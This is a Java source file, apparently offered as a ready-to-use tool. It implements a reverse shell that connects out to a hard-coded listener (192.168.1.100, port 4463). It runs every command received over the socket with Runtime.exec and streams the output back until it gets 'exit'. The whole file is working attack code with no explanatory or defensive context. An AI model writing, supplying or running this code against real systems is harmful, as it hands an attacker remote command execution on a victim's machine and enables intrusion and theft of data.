import java.io.*;
import java.net.*;

public class JavaReverseAdvanced {
    public static void main(String[] args) throws Exception {
        String LHOST = "192.168.1.100";
        int LPORT = 4463;

        Socket socket = new Socket(LHOST, LPORT);
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);

        while (true) {
            String command = in.readLine();
            if (command.equals("exit")) break;

            Process p = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
        }

        socket.close();
    }
}
